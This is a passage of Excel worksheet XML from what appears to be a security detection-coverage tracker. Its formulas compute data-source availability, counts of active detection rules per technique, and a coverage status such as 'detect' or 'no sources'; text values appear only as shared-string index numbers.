        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P37" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S3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7" t="s">
        <v>517</v>
      </c>
      <c r="U37" t="s">
        <v>518</v>
      </c>
      <c r="W37" t="b">
        <v>1</v>
      </c>
      <c r="X37" t="s">
        <v>483</v>
      </c>
    </row>
    <row r="38" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A38" t="s">
        <v>483</v>
      </c>
      <c r="B38" t="s">
        <v>519</v>
      </c>
      <c r="C38" t="s">
        <v>293</v>
      </c>
      <c r="D38" t="s">
        <v>9</v>
      </c>
      <c r="E38" t="s">
        <v>516</v>
      </c>
      <c r="F38" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G38" s="9" cm="1">
        <f t="array" ref="G38">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H38" s="9" t="str" cm="1">
        <f t="array" ref="H38">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I38" s="9" t="str" cm="1">
        <f t="array" ref="I38">IF(SUM(IF($C38=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C38=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J38" s="9" t="str" cm="1">
        <f t="array" ref="J3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8" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M38" s="9" cm="1">
        <f t="array" ref="M38">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N38" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O38" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P38" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S3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8" t="s">
        <v>520</v>
      </c>
      <c r="U38" t="s">
        <v>521</v>
      </c>
      <c r="W38" t="b">
        <v>1</v>
      </c>
      <c r="X38" t="s">
        <v>483</v>
      </c>
    </row>
    <row r="39" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A39" t="s">
        <v>522</v>
      </c>
      <c r="B39" t="s">
        <v>522</v>
      </c>
      <c r="C39" t="s">
        <v>155</v>
      </c>
      <c r="D39" t="s">
        <v>10</v>
      </c>
      <c r="E39" t="s">
        <v>396</v>
      </c>
      <c r="F39" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G39" s="9" cm="1">
        <f t="array" ref="G39">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H39" s="9" cm="1">
        <f t="array" ref="H39">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I39" s="9" t="str" cm="1">
        <f t="array" ref="I39">IF(SUM(IF($C39=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C39=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J39" s="9" t="str" cm="1">
        <f t="array" ref="J3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9" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M39" s="9" cm="1">
        <f t="array" ref="M39">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N39" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O39" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P39" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S3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9" t="s">
        <v>368</v>
      </c>
      <c r="U39" t="s">
        <v>523</v>
      </c>
      <c r="V39" t="s">
        <v>524</v>
      </c>
      <c r="W39" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="40" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A40" t="s">
        <v>525</v>
      </c>
      <c r="B40" t="s">
        <v>525</v>
      </c>
      <c r="C40" t="s">
        <v>197</v>
      </c>
      <c r="D40" t="s">
        <v>6</v>
      </c>
      <c r="E40" t="s">
        <v>526</v>
      </c>
      <c r="F40" s="9">
        <f t="shared" si="0"/>
        <v>10</v>
      </c>
      <c r="G40" s="9" cm="1">
        <f t="array" ref="G40">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H40" s="9" cm="1">
        <f t="array" ref="H40">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>14</v>
      </c>
      <c r="I40" s="9" t="str" cm="1">
        <f t="array" ref="I40">IF(SUM(IF($C40=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C40=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J40" s="9" cm="1">
        <f t="array" ref="J4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1</v>
      </c>
      <c r="K40" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>14</v>
      </c>
      <c r="M40" s="9" cm="1">
        <f t="array" ref="M40">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>14</v>
      </c>
      <c r="N40" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>1</v>
      </c>
      <c r="O40" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>7.1428571428571425E-2</v>
      </c>
      <c r="P40" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>detect</v>
      </c>
      <c r="S4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0" t="s">
        <v>425</v>
      </c>
      <c r="U40" t="s">
        <v>527</v>
      </c>
      <c r="V40" t="s">
        <v>528</v>
      </c>
      <c r="W40" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="41" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A41" t="s">
        <v>525</v>
      </c>
      <c r="B41" t="s">
        <v>529</v>
      </c>
      <c r="C41" t="s">
        <v>530</v>
      </c>
      <c r="D41" t="s">
        <v>6</v>
      </c>
      <c r="E41" t="s">
        <v>531</v>
      </c>
      <c r="F41" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G41" s="9" cm="1">
        <f t="array" ref="G41">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H41" s="9" t="str" cm="1">
        <f t="array" ref="H41">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I41" s="9" t="str" cm="1">
        <f t="array" ref="I41">IF(SUM(IF($C41=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C41=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J41" s="9" t="str" cm="1">
        <f t="array" ref="J4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1" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M41" s="9" cm="1">
        <f t="array" ref="M41">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N41" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O41" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P41" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S4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1" t="s">
        <v>368</v>
      </c>
      <c r="U41" t="s">
        <v>532</v>
      </c>
      <c r="V41" t="s">
        <v>533</v>
      </c>
      <c r="W41" t="b">
        <v>1</v>
      </c>
      <c r="X41" t="s">
        <v>525</v>
      </c>
    </row>
    <row r="42" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A42" t="s">
        <v>525</v>
      </c>
      <c r="B42" t="s">
        <v>534</v>
      </c>
      <c r="C42" t="s">
        <v>535</v>
      </c>
      <c r="D42" t="s">
        <v>6</v>
      </c>
      <c r="E42" t="s">
        <v>531</v>
      </c>
      <c r="F42" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G42" s="9" cm="1">
        <f t="array" ref="G42">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H42" s="9" t="str" cm="1">
        <f t="array" ref="H42">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I42" s="9" t="str" cm="1">
        <f t="array" ref="I42">IF(SUM(IF($C42=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C42=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J42" s="9" t="str" cm="1">
        <f t="array" ref="J4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2" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M42" s="9" cm="1">
        <f t="array" ref="M42">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N42" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O42" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P42" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S4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2" t="s">
        <v>368</v>
      </c>
      <c r="U42" t="s">
        <v>536</v>
      </c>
      <c r="V42" t="s">
        <v>537</v>
      </c>
      <c r="W42" t="b">
        <v>1</v>
      </c>
      <c r="X42" t="s">
        <v>525</v>
      </c>
    </row>
    <row r="43" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A43" t="s">
        <v>525</v>
      </c>
      <c r="B43" t="s">
        <v>538</v>
      </c>
      <c r="C43" t="s">
        <v>539</v>
      </c>
      <c r="D43" t="s">
        <v>6</v>
      </c>
      <c r="E43" t="s">
        <v>531</v>
      </c>
      <c r="F43" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G43" s="9" cm="1">
        <f t="array" ref="G43">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H43" s="9" t="str" cm="1">
        <f t="array" ref="H43">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I43" s="9" t="str" cm="1">
        <f t="array" ref="I43">IF(SUM(IF($C43=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C43=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J43" s="9" t="str" cm="1">
        <f t="array" ref="J4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3" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M43" s="9" cm="1">
        <f t="array" ref="M43">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N43" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O43" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P43" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S4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3" t="s">
        <v>368</v>
      </c>
      <c r="U43" t="s">
        <v>540</v>
      </c>
      <c r="V43" t="s">
        <v>541</v>
      </c>
      <c r="W43" t="b">
        <v>1</v>
      </c>
      <c r="X43" t="s">
        <v>525</v>
      </c>
    </row>
    <row r="44" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A44" t="s">
        <v>525</v>
      </c>
      <c r="B44" t="s">
        <v>542</v>
      </c>
      <c r="C44" t="s">
        <v>543</v>
      </c>
      <c r="D44" t="s">
        <v>6</v>
      </c>
      <c r="E44" t="s">
        <v>544</v>
      </c>
      <c r="F44" s="9">
        <f t="shared" si="0"/>
        <v>4</v>
      </c>
      <c r="G44" s="9" cm="1">
        <f t="array" ref="G44">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H44" s="9" t="str" cm="1">
        <f t="array" ref="H44">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I44" s="9" t="str" cm="1">
        <f t="array" ref="I44">IF(SUM(IF($C44=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C44=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J44" s="9" t="str" cm="1">
        <f t="array" ref="J4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4" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M44" s="9" cm="1">
        <f t="array" ref="M44">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N44" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O44" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P44" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S4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4" t="s">
        <v>368</v>
      </c>
      <c r="U44" t="s">
        <v>545</v>
      </c>
      <c r="V44" t="s">
        <v>546</v>
      </c>
      <c r="W44" t="b">
        <v>1</v>
      </c>
      <c r="X44" t="s">
        <v>525</v>
      </c>
    </row>
    <row r="45" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A45" t="s">
        <v>525</v>
      </c>
      <c r="B45" t="s">
        <v>547</v>
      </c>
      <c r="C45" t="s">
        <v>548</v>
      </c>
      <c r="D45" t="s">
        <v>6</v>
      </c>
      <c r="E45" t="s">
        <v>549</v>
      </c>
      <c r="F45" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G45" s="9" cm="1">
        <f t="array" ref="G45">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H45" s="9" t="str" cm="1">
        <f t="array" ref="H45">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I45" s="9" t="str" cm="1">
        <f t="array" ref="I45">IF(SUM(IF($C45=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C45=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J45" s="9" t="str" cm="1">
        <f t="array" ref="J4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5" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M45" s="9" cm="1">
        <f t="array" ref="M45">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N45" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O45" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P45" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S4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5" t="s">
        <v>368</v>
      </c>
      <c r="U45" t="s">
        <v>550</v>
      </c>
      <c r="V45" t="s">
        <v>551</v>
      </c>
      <c r="W45" t="b">
        <v>1</v>
      </c>
      <c r="X45" t="s">
        <v>525</v>
      </c>
    </row>
    <row r="46" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A46" t="s">
        <v>525</v>
      </c>
      <c r="B46" t="s">
        <v>552</v>
      </c>
      <c r="C46" t="s">
        <v>553</v>
      </c>
      <c r="D46" t="s">
        <v>6</v>
      </c>
      <c r="E46" t="s">
        <v>554</v>
      </c>
      <c r="F46" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G46" s="9" cm="1">
        <f t="array" ref="G46">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H46" s="9" t="str" cm="1">
        <f t="array" ref="H46">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I46" s="9" cm="1">
        <f t="array" ref="I46">IF(SUM(IF($C46=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C46=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v>1</v>
      </c>
      <c r="J46" s="9" t="str" cm="1">
        <f t="array" ref="J4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6" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M46" s="9" cm="1">
        <f t="array" ref="M46">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N46" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>1</v>
      </c>
      <c r="O46" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>1</v>
      </c>
      <c r="P46" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>inconsistent</v>
      </c>
      <c r="S4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6" t="s">
        <v>368</v>
      </c>
      <c r="U46" t="s">
        <v>555</v>
      </c>
      <c r="V46" t="s">
        <v>556</v>
      </c>
      <c r="W46" t="b">
        <v>1</v>
      </c>
      <c r="X46" t="s">
        <v>525</v>
      </c>
    </row>
    <row r="47" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A47" t="s">
        <v>525</v>
      </c>
      <c r="B47" t="s">
        <v>557</v>
      </c>
      <c r="C47" t="s">
        <v>558</v>
      </c>
      <c r="D47" t="s">
        <v>6</v>
      </c>
      <c r="E47" t="s">
        <v>559</v>
      </c>
      <c r="F47" s="9">
        <f t="shared" si="0"/>
        <v>3</v>
      </c>
      <c r="G47" s="9" cm="1">
